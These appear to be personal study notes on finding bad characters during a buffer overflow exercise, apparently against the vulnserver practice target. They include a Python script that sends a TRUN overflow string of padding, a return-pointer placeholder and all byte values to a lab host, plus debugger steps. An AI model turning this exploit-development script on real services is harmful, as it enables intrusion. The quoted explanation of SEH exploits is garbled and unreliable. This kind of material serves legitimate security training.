# Finding Bad Characters

Google `badchars`
https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

E.g. usually hex `x00` is a bad hexadecimal character that we can use in our exploits

A simple, if a bit tedious, way of checking which characters we can use in our exploit string, is to add an entire string (containing all possible hex characters) to our exploit after the saved return pointer and compare the results in memory

We want to put the bad characters after the saved return pointer overwrite to ensure that any corruption due to bad characters does not stop the saved return pointer from being overwritten

SEH - Structured Exception Handling
- an exception handling mechanism included in most programs to make them robust and reliable
- used to handle many types of errors and any exceptions that arise during the normal execution of an application 

> SEH exploits happen when the exception handler of an application is manipulated, causing it to force an application to close. Hackers normally attack the logic of the SEH, causing it to correct nonexistent errors and lead a system to a graceful shutdown. This technique is sometimes used with buffer overflows to ensure that a system brought down by overflows is closed to prevent unnecessary and excessive damage.

> Placement may be a factor when working with SEH overwrites. You need not put the bad characters after the SEH overwrite but you do need to take note of what is causing the exception and make sure your bad characters don’t stop it from occurring. For example if your vulnerable software is throwing an exception while reading 41414141 when you are sending a long string of A’s, you need to insure that you avoid putting your bad characters at the offset that is causing that read error or else you may end up reading from a spot in memory that is mapped and readable by the application, avoiding the exception altogether.

Add badchars to our script and delete the x00 char which is always a bad character:
```
#!/usr/bin/python
import sys, socket

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.0.2.15',9999))
		s.send(('TRUN /.:/' + shellcode ))
		s.close()
	except:
		print "Error connecting to server"
		sys.exit()
```

We run every badchar through our program 
Programs have particular characters and hex codes that might refer to particular commands. If that is the case, we want to make sure to remove these from our generated shell code, so it can be interpreted as we want it.

RUN PROGRAM WITHOUT THE x00 badchar cause we know it is bad in default

Hence, we parse all these through the program and check which ones.

After running the program again, need to check the hexdump

`ESP > Right Click > Follow in Dump`

Bottom left Hex dump: Text > Font > OEM (Biggest)

We go through the whole list and should have `01 02 03 ... FE FF` i.e. all the way. If something is looking funny, it is a bad char and needs to be removed 

Need to note down all hex characters that we cannot use when generating our shell code

